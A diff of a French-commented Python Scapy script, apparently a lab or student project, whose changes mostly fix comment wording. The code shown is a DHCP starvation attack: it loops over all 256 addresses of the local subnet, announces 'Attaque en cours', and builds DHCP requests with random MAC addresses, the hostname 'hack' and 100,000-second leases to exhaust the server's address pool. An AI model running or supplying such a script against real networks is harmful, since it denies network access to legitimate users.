@@ -19,29 +19,29 @@ frame_discover_l3 = UDP(dport=67,sport=68)
 #Ajout de l'en-tête "BOOTP" afin de spécifier des options, "op=1" indique qu'il s'agit d'une demande de démarrage, de plus, l'adresse MAC du client se voit attribuer une adresse aléatoire
 frame_discover_l4 = BOOTP(op=1, chaddr=RandMAC())
 
-#Récuperation de l'ip de la carte réseau utilisé
+#Récuperation de l'IP de la carte réseau utilisé
 ip = get_if_addr(interface)
-#Séparation de tout les octets de l'ip et stockage dans une liste
+#Séparation de tout les octets de l'IP et stockage dans une liste
 liste = ip.split(".")
-#Suppression du dernier octets de l'ip
+#Suppression du dernier octet de l'IP
 liste.pop(3)
 ip_str = ""
-#Pour chaque tour de boucle nous supprimons les points afin d'avoir une ip sans .
+#Pour chaque tour de boucle nous supprimons les points afin d'obtenir une IP sans "."
 for i in range(len(liste)):
     if(i!=0):
         ip_str = (ip_str + "." + liste[i])
     else:
         ip_str = (ip_str+ liste[i])
-#A chaque tour de boucle nous ajoutons 1 au dernier octets de l'ip puis nous reconstruison l'ip avec les . à partir de la liste
+#À chaque tour de boucle nous ajoutons "1" au dernier octet de l'IP puis nous reconstruisons l'IP avec les "." à partir de la liste
 for j in range(0,256):
     liste = ip.split(".")
     liste.pop(3)
     str_vide = ""
     new = ip_str+str_vide+ "."+str(j)
     print("Attaque en cours sur l'ip "+new)
-#Création de la couche 4 du paquets avec comme adresse de destination l'ip généré dans la boucle
+#Création de la couche 4 du paquets avec comme adresse de destination l'IP générée dans la boucle
     frame_release_l4 = BOOTP(ciaddr=new, xid=RandInt())
-#Création du message DHCP avec un type de message request, ainsi qu'un lease time (temps ou l'ip ne peut pas etre redistribué) à 100000 sec
+#Création du message DHCP avec un type de message "request", ainsi qu'un "lease time" correspondant au temps où l'IP ne peut pas être redistribuée, ici, à 100 000 secondes
     frame_discover_l5 = DHCP(options=[("message-type","request"),("requested_addr",new),("hostname","hack"),("lease_time",100000),"end"])
 #Encapsulation des différentes couches afin d'obtenir un paquet
     frame_discover = frame_discover_l1 / frame_discover_l2 / frame_discover_l3 / frame_discover_l4 / frame_discover_l5
